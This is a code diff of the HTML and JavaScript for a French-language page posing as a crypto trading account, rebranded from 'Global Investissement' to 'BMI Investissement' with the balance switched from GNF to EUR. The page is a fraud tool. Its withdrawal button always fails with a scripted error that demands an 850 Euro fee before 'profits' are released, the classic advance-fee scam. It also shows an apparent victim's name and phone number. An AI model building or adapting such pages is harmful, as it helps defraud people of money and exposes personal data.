@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Interface de Trading Crypto - Global Investissement</title>
+    <title>Interface de Trading Crypto - BMI Investissement</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -240,11 +240,11 @@
 
     <header>
         <div class="logo">
-            <h1>Global Investissement</h1>
+            <h1>BMI Investissement</h1>
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 52 411 413 GNF</span>
+                <span class="balance">Solde: 4 876,98 EUR</span>
                 <div class="account-info">
                     <span>DIALLO ALPHA AMADOU DIOULDÉ</span><br>
                     <span>610468985</span>
@@ -274,14 +274,14 @@
                 </div>
             </div>
             <div class="withdrawal-options">
-                <button id="wave">Retrait via Wave</button>
+                <button id="orange-money">Retrait via Orange Money</button>
             </div>
             <div class="withdrawal-form" id="withdrawal-form">
                 <h3>Confirmer le retrait</h3>
                 <div class="info">
                     <p>Nom: DIALLO ALPHA AMADOU DIOULDÉ</p>
                     <p>Numéro: 610468985</p>
-                    <p>Montant: 52 411 413 GNF</p>
+                    <p>Montant: 4 876,98 EUR</p>
                 </div>
                 <button id="confirm-withdrawal">Valider le Retrait</button>
             </div>
@@ -289,7 +289,7 @@
         </div>
     </main>
     <footer>
-        <p>© 2024 Global Investissement. Tous droits réservés.</p>
+        <p>© 2024 BMI Investissement. Tous droits réservés.</p>
     </footer>
     <script>
         document.addEventListener("DOMContentLoaded", () => {
@@ -308,13 +308,13 @@
 
             setInterval(updatePrice, 5000);
 
-            document.getElementById('wave').addEventListener('click', () => {
+            document.getElementById('orange-money').addEventListener('click', () => {
                 withdrawalForm.style.display = 'flex';
                 errorMessage.textContent = '';
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                errorMessage.textContent = 'Erreur : Veuillez régler vos frais de 850 Euro aupres de Global investissement pour entrer en possession de vos bénéfices.';
+                errorMessage.textContent = 'Erreur : Veuillez régler vos frais de 850 Euro auprès de BMI Investissement pour entrer en possession de vos bénéfices.';
                 withdrawalForm.style.display = 'none';
             });
 
